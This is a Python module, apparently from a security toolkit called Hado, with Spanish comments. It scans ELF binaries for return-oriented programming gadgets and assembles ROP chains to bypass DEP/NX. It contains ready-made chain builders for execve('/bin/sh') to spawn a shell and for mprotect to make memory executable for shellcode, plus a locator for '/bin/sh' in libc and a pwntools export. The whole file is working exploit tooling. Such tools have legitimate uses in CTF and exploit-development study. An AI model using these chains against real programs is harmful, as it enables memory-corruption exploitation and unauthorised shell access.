"""
hado.cybersec.rop — ROP (Return-Oriented Programming) gadget finder and chain builder.

Busca gadgets en binarios y construye cadenas ROP para bypass de DEP/NX.
100% stdlib Python — cero dependencias externas.

Uso directo:
    from hado.cybersec.rop import find_gadgets, build_rop_chain, RopChain
"""
from __future__ import annotations

import os
import struct
from typing import Dict, List, Optional, Tuple, Union


# ─── Gadget database (x86-64 common patterns) ────────────────────────────────

# Formato: {bytes_hex: mnemonic}
GADGET_PATTERNS_X64 = {
    # Single ret
    b'\xc3':           'ret',
    b'\xcb':           'retf',
    b'\xc2\x00\x00':  'ret 0',

    # pop rdi ; ret  (1st arg — System V AMD64 ABI)
    b'\x5f\xc3':       'pop rdi ; ret',
    # pop rsi ; ret  (2nd arg)
    b'\x5e\xc3':       'pop rsi ; ret',
    # pop rdx ; ret  (3rd arg)
    b'\x5a\xc3':       'pop rdx ; ret',
    # pop rcx ; ret  (4th arg)
    b'\x59\xc3':       'pop rcx ; ret',
    # pop r8 ; ret   (5th arg)
    b'\x41\x58\xc3':   'pop r8 ; ret',
    # pop r9 ; ret   (6th arg)
    b'\x41\x59\xc3':   'pop r9 ; ret',

    # pop rax ; ret  (syscall number / return value)
    b'\x58\xc3':       'pop rax ; ret',
    # pop rbx ; ret
    b'\x5b\xc3':       'pop rbx ; ret',
    # pop rbp ; ret
    b'\x5d\xc3':       'pop rbp ; ret',
    # pop rsp ; ret
    b'\x5c\xc3':       'pop rsp ; ret',
    # pop r10 ; ret
    b'\x41\x5a\xc3':   'pop r10 ; ret',
    # pop r11 ; ret
    b'\x41\x5b\xc3':   'pop r11 ; ret',
    # pop r12 ; ret
    b'\x41\x5c\xc3':   'pop r12 ; ret',
    # pop r13 ; ret
    b'\x41\x5d\xc3':   'pop r13 ; ret',
    # pop r14 ; ret
    b'\x41\x5e\xc3':   'pop r14 ; ret',
    # pop r15 ; ret
    b'\x41\x5f\xc3':   'pop r15 ; ret',

    # xor rax, rax ; ret  (zero rax)
    b'\x48\x31\xc0\xc3': 'xor rax, rax ; ret',
    # xor edi, edi ; ret  (zero edi/rdi lower 32)
    b'\x31\xff\xc3':   'xor edi, edi ; ret',
    # xor rdi, rdi ; ret
    b'\x48\x31\xff\xc3': 'xor rdi, rdi ; ret',

    # mov [rdi], rsi ; ret  (write primitive)
    b'\x48\x89\x37\xc3': 'mov [rdi], rsi ; ret',
    # mov rax, [rdi] ; ret  (read primitive)
    b'\x48\x8b\x07\xc3': 'mov rax, [rdi] ; ret',

    # syscall
    b'\x0f\x05':       'syscall',
    # syscall ; ret
    b'\x0f\x05\xc3':   'syscall ; ret',

    # int 0x80 (legacy)
    b'\xcd\x80':       'int 0x80',
    b'\xcd\x80\xc3':   'int 0x80 ; ret',

    # nop ; ret
    b'\x90\xc3':       'nop ; ret',

    # add rsp, N ; ret  (stack pivot gadgets)
    b'\x48\x83\xc4\x08\xc3': 'add rsp, 8 ; ret',
    b'\x48\x83\xc4\x10\xc3': 'add rsp, 16 ; ret',
    b'\x48\x83\xc4\x18\xc3': 'add rsp, 24 ; ret',
    b'\x48\x83\xc4\x20\xc3': 'add rsp, 32 ; ret',

    # leave ; ret  (stack pivot via rbp)
    b'\xc9\xc3':       'leave ; ret',

    # push rsp ; pop rdi ; ret  (rdi = stack pointer)
    b'\x54\x5f\xc3':   'push rsp ; pop rdi ; ret',
}

GADGET_PATTERNS_X86 = {
    b'\xc3':           'ret',
    b'\x5f\xc3':       'pop edi ; ret',
    b'\x5e\xc3':       'pop esi ; ret',
    b'\x5a\xc3':       'pop edx ; ret',
    b'\x59\xc3':       'pop ecx ; ret',
    b'\x58\xc3':       'pop eax ; ret',
    b'\x5b\xc3':       'pop ebx ; ret',
    b'\x5d\xc3':       'pop ebp ; ret',
    b'\x5c\xc3':       'pop esp ; ret',
    b'\xff\xe4':       'jmp esp',
    b'\xff\xe0':       'jmp eax',
    b'\xff\xd4':       'call esp',
    b'\xcd\x80':       'int 0x80',
    b'\xcd\x80\xc3':   'int 0x80 ; ret',
    b'\x31\xc0\xc3':   'xor eax, eax ; ret',
    b'\x31\xd2\xc3':   'xor edx, edx ; ret',
    b'\xc9\xc3':       'leave ; ret',
    b'\x90\xc3':       'nop ; ret',
    b'\x83\xc4\x04\xc3': 'add esp, 4 ; ret',
    b'\x83\xc4\x08\xc3': 'add esp, 8 ; ret',
    b'\x83\xc4\x0c\xc3': 'add esp, 12 ; ret',
    b'\x83\xc4\x10\xc3': 'add esp, 16 ; ret',
}


# ─── Core gadget finder ───────────────────────────────────────────────────────

class Gadget:
    """Represents a single ROP gadget."""

    def __init__(self, address: int, instructions: str, raw: bytes):
        self.address = address
        self.instructions = instructions
        self.raw = raw

    def __repr__(self) -> str:
        return f"Gadget(0x{self.address:016x}: {self.instructions})"

    def __str__(self) -> str:
        return f"0x{self.address:016x}: {self.instructions}"

    def to_dict(self) -> Dict:
        return {
            "address": hex(self.address),
            "instructions": self.instructions,
            "raw": self.raw.hex(),
            "size": len(self.raw),
        }


def find_gadgets(
    binary_path: str,
    arch: str = 'x86-64',
    base_addr: int = 0,
    max_gadgets: int = 1000,
) -> List[Gadget]:
    """
    Busca gadgets ROP en un binario (o segmento ejecutable).

    Estrategia:
      1. Lee el binario completo como bytes
      2. Para ELF: solo escanea segmentos ejecutables (PT_LOAD con PF_X)
      3. Busca cada patrón conocido en el buffer
      4. Devuelve lista de Gadget con dirección virtual real

    Args:
        binary_path: ruta al binario ELF/PE o cualquier archivo de bytes
        arch:        'x86-64' o 'x86'
        base_addr:   dirección base de carga (0 = usar del binario o heurístico)
        max_gadgets: límite de gadgets a retornar

    Returns:
        Lista de Gadget ordenada por dirección

    Ejemplo:
        >>> gadgets = find_gadgets('/bin/ls')
        >>> pop_rdi = find_gadget_by_name(gadgets, 'pop rdi')
        >>> print(pop_rdi)
        0x00401234: pop rdi ; ret
    """
    if not os.path.exists(binary_path):
        raise FileNotFoundError(f"Binario no encontrado: {binary_path}")

    with open(binary_path, 'rb') as f:
        data = f.read()

    patterns = GADGET_PATTERNS_X64 if arch == 'x86-64' else GADGET_PATTERNS_X86

    # Intentar parsear como ELF para obtener segmentos ejecutables
    exec_regions = _get_executable_regions_elf(data, base_addr)

    gadgets = []
    seen_addrs = set()

    if exec_regions:
        # Escanear solo regiones ejecutables
        for (file_offset, vaddr, size) in exec_regions:
            segment_data = data[file_offset:file_offset + size]
            _scan_region(segment_data, patterns, vaddr, gadgets, seen_addrs, max_gadgets)
            if len(gadgets) >= max_gadgets:
                break
    else:
        # Fallback: escanear todo el archivo
        _scan_region(data, patterns, base_addr, gadgets, seen_addrs, max_gadgets)

    gadgets.sort(key=lambda g: g.address)
    return gadgets[:max_gadgets]


def find_gadgets_in_bytes(
    data: bytes,
    arch: str = 'x86-64',
    base_addr: int = 0x400000,
) -> List[Gadget]:
    """
    Busca gadgets directamente en un buffer de bytes.
    Útil cuando ya tienes el contenido del binario en memoria.

    Args:
        data:      bytes del binario o segmento
        arch:      'x86-64' o 'x86'
        base_addr: dirección base virtual

    Returns:
        Lista de Gadget
    """
    patterns = GADGET_PATTERNS_X64 if arch == 'x86-64' else GADGET_PATTERNS_X86
    gadgets = []
    seen_addrs: set = set()
    _scan_region(data, patterns, base_addr, gadgets, seen_addrs, 10000)
    gadgets.sort(key=lambda g: g.address)
    return gadgets


def _scan_region(
    data: bytes,
    patterns: Dict[bytes, str],
    base_vaddr: int,
    gadgets: List[Gadget],
    seen_addrs: set,
    max_gadgets: int,
) -> None:
    """Escanea un buffer de bytes buscando todos los patrones."""
    for pattern_bytes, mnemonic in patterns.items():
        offset = 0
        while True:
            idx = data.find(pattern_bytes, offset)
            if idx == -1:
                break
            vaddr = base_vaddr + idx
            if vaddr not in seen_addrs and len(gadgets) < max_gadgets:
                seen_addrs.add(vaddr)
                gadgets.append(Gadget(vaddr, mnemonic, pattern_bytes))
            offset = idx + 1


def _get_executable_regions_elf(data: bytes, explicit_base: int = 0) -> List[Tuple[int, int, int]]:
    """
    Parsea cabecera ELF y retorna lista de (file_offset, vaddr, size)
    para segmentos ejecutables (PT_LOAD con PF_X).

    Returns [] si no es ELF válido.
    """
    if len(data) < 64 or data[:4] != b'\x7fELF':
        return []

    try:
        ei_class = data[4]  # 1=32bit, 2=64bit
        ei_data = data[5]   # 1=LE, 2=BE
        endian = '<' if ei_data == 1 else '>'

        if ei_class == 2:  # 64-bit
            fmt_hdr = f'{endian}HHIQQQIHHHHHH'
            hdr = struct.unpack_from(fmt_hdr, data, 16)
            e_phoff = hdr[4]   # program header offset
            e_phentsize = hdr[8]
            e_phnum = hdr[9]
            fmt_ph = f'{endian}IIQQQQQQ'
            ph_size = 56
        else:  # 32-bit
            fmt_hdr = f'{endian}HHIIIIIHHHHHH'
            hdr = struct.unpack_from(fmt_hdr, data, 16)
            e_phoff = hdr[3]
            e_phentsize = hdr[7]
            e_phnum = hdr[8]
            fmt_ph = f'{endian}IIIIIIII'
            ph_size = 32

        regions = []
        for i in range(e_phnum):
            ph_offset = e_phoff + i * ph_size
            ph = struct.unpack_from(fmt_ph, data, ph_offset)

            if ei_class == 2:
                p_type = ph[0]
                p_flags = ph[1]
                p_offset = ph[2]
                p_vaddr = ph[3]
                p_filesz = ph[6]
            else:
                p_type = ph[0]
                p_offset = ph[1]
                p_vaddr = ph[2]
                p_flags = ph[7]
                p_filesz = ph[4]

            PT_LOAD = 1
            PF_X = 1  # executable flag

            if p_type == PT_LOAD and (p_flags & PF_X):
                base = explicit_base if explicit_base else p_vaddr
                vaddr = base + (p_vaddr - p_vaddr) if not explicit_base else base + p_offset
                # Use actual vaddr from ELF unless overridden
                actual_vaddr = explicit_base if explicit_base else p_vaddr
                regions.append((p_offset, actual_vaddr, p_filesz))

        return regions
    except Exception:
        return []


# ─── Gadget search helpers ────────────────────────────────────────────────────

def find_gadget_by_name(gadgets: List[Gadget], name: str) -> Optional[Gadget]:
    """
    Busca el primer gadget que contenga 'name' en sus instrucciones.

    Ejemplo:
        >>> g = find_gadget_by_name(gadgets, 'pop rdi')
        >>> g.address
        0x401234
    """
    name_lower = name.lower()
    for g in gadgets:
        if name_lower in g.instructions.lower():
            return g
    return None


def find_gadgets_by_name(gadgets: List[Gadget], name: str) -> List[Gadget]:
    """Retorna todos los gadgets que contengan 'name'."""
    name_lower = name.lower()
    return [g for g in gadgets if name_lower in g.instructions.lower()]


def find_ret_gadgets(gadgets: List[Gadget]) -> List[Gadget]:
    """Retorna solo gadgets 'ret' (sin pop previo)."""
    return [g for g in gadgets if g.instructions.strip() == 'ret']


def find_syscall_gadgets(gadgets: List[Gadget]) -> List[Gadget]:
    """Retorna gadgets de syscall/int 0x80."""
    return [g for g in gadgets if 'syscall' in g.instructions or 'int 0x80' in g.instructions]


def find_pivot_gadgets(gadgets: List[Gadget]) -> List[Gadget]:
    """Retorna stack pivot gadgets (jmp esp, leave; ret, add rsp, etc.)."""
    pivots = ['jmp esp', 'jmp eax', 'call esp', 'leave', 'add rsp', 'add esp', 'push rsp']
    return [g for g in gadgets if any(p in g.instructions for p in pivots)]


def gadgets_summary(gadgets: List[Gadget]) -> Dict:
    """
    Resumen estadístico de los gadgets encontrados.

    Returns:
        dict con total, por categoría, y lista de los más útiles
    """
    pop_gadgets = find_gadgets_by_name(gadgets, 'pop')
    syscall_gadgets = find_syscall_gadgets(gadgets)
    pivot_gadgets = find_pivot_gadgets(gadgets)
    ret_gadgets = find_ret_gadgets(gadgets)

    return {
        "total": len(gadgets),
        "ret": len(ret_gadgets),
        "pop_reg_ret": len(pop_gadgets),
        "syscall": len(syscall_gadgets),
        "stack_pivots": len(pivot_gadgets),
        "useful_gadgets": {
            "pop_rdi_ret": find_gadget_by_name(gadgets, 'pop rdi ; ret'),
            "pop_rsi_ret": find_gadget_by_name(gadgets, 'pop rsi ; ret'),
            "pop_rdx_ret": find_gadget_by_name(gadgets, 'pop rdx ; ret'),
            "pop_rax_ret": find_gadget_by_name(gadgets, 'pop rax ; ret'),
            "syscall":     find_gadget_by_name(gadgets, 'syscall'),
            "ret":         find_ret_gadgets(gadgets)[0] if ret_gadgets else None,
        },
    }


# ─── ROP Chain builder ────────────────────────────────────────────────────────

class RopChain:
    """
    Constructor de cadenas ROP.

    Ejemplo:
        >>> chain = RopChain(arch='x86-64')
        >>> chain.add_gadget(pop_rdi, 0x601000)   # rdi = /bin/sh addr
        >>> chain.add_gadget(pop_rsi, 0)           # rsi = 0
        >>> chain.add_gadget(pop_rdx, 0)           # rdx = 0
        >>> chain.add_syscall(59)                  # execve = 59
        >>> payload = chain.build()
    """

    def __init__(self, arch: str = 'x86-64'):
        self.arch = arch
        self.chain: List[Tuple[str, bytes]] = []  # (description, bytes)
        self._pack = struct.Struct('<Q').pack if arch == 'x86-64' else struct.Struct('<I').pack
        self._word_size = 8 if arch == 'x86-64' else 4

    def add_gadget(self, gadget: Gadget, value: int = None, comment: str = '') -> 'RopChain':
        """
        Agrega un gadget a la cadena. Si 'value' se especifica,
        agrega la dirección del gadget + el valor (para gadgets pop reg; ret).

        Args:
            gadget: Gadget object con .address
            value:  valor a pasar después del gadget (opcional)
            comment: comentario descriptivo

        Returns:
            self (para chaining)
        """
        desc = comment or gadget.instructions
        self.chain.append((f"gadget: {desc}", self._pack(gadget.address)))
        if value is not None:
            self.chain.append((f"  value: {hex(value)}", self._pack(value & ((1 << (self._word_size * 8)) - 1))))
        return self

    def add_addr(self, address: int, comment: str = '') -> 'RopChain':
        """Agrega una dirección arbitraria a la cadena."""
        self.chain.append((comment or hex(address), self._pack(address)))
        return self

    def add_value(self, value: int, comment: str = '') -> 'RopChain':
        """Agrega un valor arbitrario (no dirección) a la cadena."""
        self.chain.append((comment or f"val: {hex(value)}", self._pack(value & ((1 << (self._word_size * 8)) - 1))))
        return self

    def add_string(self, s: str, comment: str = '') -> 'RopChain':
        """Agrega un string en raw bytes a la cadena."""
        padded = s.encode() + b'\x00' * (self._word_size - len(s) % self._word_size or self._word_size)
        self.chain.append((comment or f"str: {repr(s)}", padded[:self._word_size]))
        return self

    def add_syscall(self, number: int, gadgets: Optional[List[Gadget]] = None, comment: str = '') -> 'RopChain':
        """
        Agrega número de syscall via pop rax; ret + syscall.
        Requiere que pop_rax_ret y syscall_gadget estén disponibles.

        Args:
            number:  número de syscall (ej: 59 = execve en x86-64 Linux)
            gadgets: lista de gadgets donde buscar pop rax + syscall
            comment: comentario
        """
        if gadgets:
            pop_rax = find_gadget_by_name(gadgets, 'pop rax ; ret')
            syscall = find_gadget_by_name(gadgets, 'syscall')
            if pop_rax:
                self.chain.append((f"pop rax ; ret [{comment}]", self._pack(pop_rax.address)))
                self.chain.append((f"  syscall# {number} ({comment})", self._pack(number)))
            if syscall:
                self.chain.append(("syscall", self._pack(syscall.address)))
        else:
            # Solo agrega el número para construcción manual
            self.chain.append((f"syscall# {number} ({comment})", self._pack(number)))
        return self

    def build(self) -> bytes:
        """Ensambla la cadena ROP en bytes."""
        return b''.join(b for _, b in self.chain)

    def display(self) -> str:
        """Muestra la cadena ROP en formato legible."""
        lines = [f"ROP Chain ({self.arch}) — {len(self.chain)} entries:"]
        offset = 0
        for desc, data in self.chain:
            addr = struct.unpack('<Q', data.ljust(8, b'\x00')[:8])[0]
            lines.append(f"  [{offset:+05d}] 0x{addr:016x}  ; {desc}")
            offset += len(data)
        lines.append(f"Total: {offset} bytes")
        return '\n'.join(lines)

    def to_pwntools(self) -> str:
        """Genera código Python compatible con pwntools."""
        lines = [
            f"from pwn import *",
            f"",
            f"# ROP Chain — generado por Hado",
            f"rop = b''",
        ]
        for desc, data in self.chain:
            addr = struct.unpack('<Q', data.ljust(8, b'\x00')[:8])[0]
            fmt = 'p64' if self.arch == 'x86-64' else 'p32'
            lines.append(f"rop += {fmt}(0x{addr:x})  # {desc}")
        return '\n'.join(lines)

    def __len__(self) -> int:
        return len(self.build())

    def __repr__(self) -> str:
        return f"RopChain(arch={self.arch!r}, entries={len(self.chain)}, size={len(self)} bytes)"


# ─── Pre-built chain templates ────────────────────────────────────────────────

def build_execve_chain(
    gadgets: List[Gadget],
    bin_sh_addr: int,
    arch: str = 'x86-64',
) -> Optional[RopChain]:
    """
    Construye cadena ROP para execve('/bin/sh', NULL, NULL) en Linux.

    Requiere gadgets: pop rdi, pop rsi, pop rdx, pop rax (o xor rax,rax), syscall.

    Syscall numbers:
        x86-64: execve = 59
        x86:    execve = 11

    Args:
        gadgets:      lista de Gadget del binario
        bin_sh_addr:  dirección en memoria de '/bin/sh\x00'
        arch:         'x86-64' o 'x86'

    Returns:
        RopChain lista para build() o None si faltan gadgets
    """
    chain = RopChain(arch)

    if arch == 'x86-64':
        pop_rdi = find_gadget_by_name(gadgets, 'pop rdi ; ret')
        pop_rsi = find_gadget_by_name(gadgets, 'pop rsi ; ret')
        pop_rdx = find_gadget_by_name(gadgets, 'pop rdx ; ret')
        pop_rax = find_gadget_by_name(gadgets, 'pop rax ; ret')
        syscall = find_gadget_by_name(gadgets, 'syscall')

        if not all([pop_rdi, syscall]):
            return None

        # rdi = /bin/sh addr
        chain.add_gadget(pop_rdi, bin_sh_addr, comment="rdi = /bin/sh")

        # rsi = 0
        if pop_rsi:
            chain.add_gadget(pop_rsi, 0, comment="rsi = NULL")

        # rdx = 0
        if pop_rdx:
            chain.add_gadget(pop_rdx, 0, comment="rdx = NULL")

        # rax = 59 (execve)
        if pop_rax:
            chain.add_gadget(pop_rax, 59, comment="rax = 59 (execve)")

        # syscall
        chain.add_addr(syscall.address, comment="syscall")

    else:  # x86
        pop_ebx = find_gadget_by_name(gadgets, 'pop ebx ; ret')
        pop_ecx = find_gadget_by_name(gadgets, 'pop ecx ; ret')
        pop_edx = find_gadget_by_name(gadgets, 'pop edx ; ret')
        pop_eax = find_gadget_by_name(gadgets, 'pop eax ; ret')
        int80 = find_gadget_by_name(gadgets, 'int 0x80')

        if not int80:
            return None

        # eax = 11 (execve x86)
        if pop_eax:
            chain.add_gadget(pop_eax, 11, comment="eax = 11 (execve)")

        # ebx = /bin/sh addr
        if pop_ebx:
            chain.add_gadget(pop_ebx, bin_sh_addr, comment="ebx = /bin/sh")

        # ecx = 0
        if pop_ecx:
            chain.add_gadget(pop_ecx, 0, comment="ecx = NULL")

        # edx = 0
        if pop_edx:
            chain.add_gadget(pop_edx, 0, comment="edx = NULL")

        # int 0x80
        chain.add_addr(int80.address, comment="int 0x80")

    return chain


def build_mprotect_chain(
    gadgets: List[Gadget],
    addr: int,
    size: int,
    prot: int = 7,  # PROT_READ|WRITE|EXEC
    arch: str = 'x86-64',
) -> Optional[RopChain]:
    """
    Construye cadena ROP para mprotect(addr, size, PROT_READ|WRITE|EXEC).
    Útil para marcar páginas como ejecutables y luego saltar a shellcode.

    Syscall numbers:
        x86-64: mprotect = 10
        x86:    mprotect = 125

    Args:
        gadgets: lista de Gadget
        addr:    dirección de página a hacer ejecutable (PAGE_ALIGN)
        size:    tamaño en bytes
        prot:    protección (7 = RWX)
        arch:    arquitectura

    Returns:
        RopChain o None
    """
    chain = RopChain(arch)

    if arch == 'x86-64':
        pop_rdi = find_gadget_by_name(gadgets, 'pop rdi ; ret')
        pop_rsi = find_gadget_by_name(gadgets, 'pop rsi ; ret')
        pop_rdx = find_gadget_by_name(gadgets, 'pop rdx ; ret')
        pop_rax = find_gadget_by_name(gadgets, 'pop rax ; ret')
        syscall = find_gadget_by_name(gadgets, 'syscall')

        if not all([pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall]):
            return None

        chain.add_gadget(pop_rax, 10, comment="rax = 10 (mprotect)")
        chain.add_gadget(pop_rdi, addr, comment=f"rdi = 0x{addr:x} (addr)")
        chain.add_gadget(pop_rsi, size, comment=f"rsi = {size} (size)")
        chain.add_gadget(pop_rdx, prot, comment=f"rdx = {prot} (prot=RWX)")
        chain.add_addr(syscall.address, comment="syscall")
    else:
        return None

    return chain


# ─── Libc helper ─────────────────────────────────────────────────────────────

def find_bin_sh_in_binary(binary_path: str) -> Optional[int]:
    """
    Busca la cadena '/bin/sh' en el binario (e.g., en libc).

    Returns:
        Offset dentro del archivo, o None si no encontrado.
        Nota: Para dirección virtual real, suma base_addr.
    """
    if not os.path.exists(binary_path):
        return None
    with open(binary_path, 'rb') as f:
        data = f.read()
    idx = data.find(b'/bin/sh\x00')
    return idx if idx != -1 else data.find(b'/bin/sh')


def find_string_in_binary(binary_path: str, s: Union[str, bytes]) -> List[int]:
    """
    Busca todas las ocurrencias de un string en el binario.

    Returns:
        Lista de offsets dentro del archivo.
    """
    if not os.path.exists(binary_path):
        return []
    with open(binary_path, 'rb') as f:
        data = f.read()
    if isinstance(s, str):
        s = s.encode()
    offsets = []
    idx = 0
    while True:
        pos = data.find(s, idx)
        if pos == -1:
            break
        offsets.append(pos)
        idx = pos + 1
    return offsets
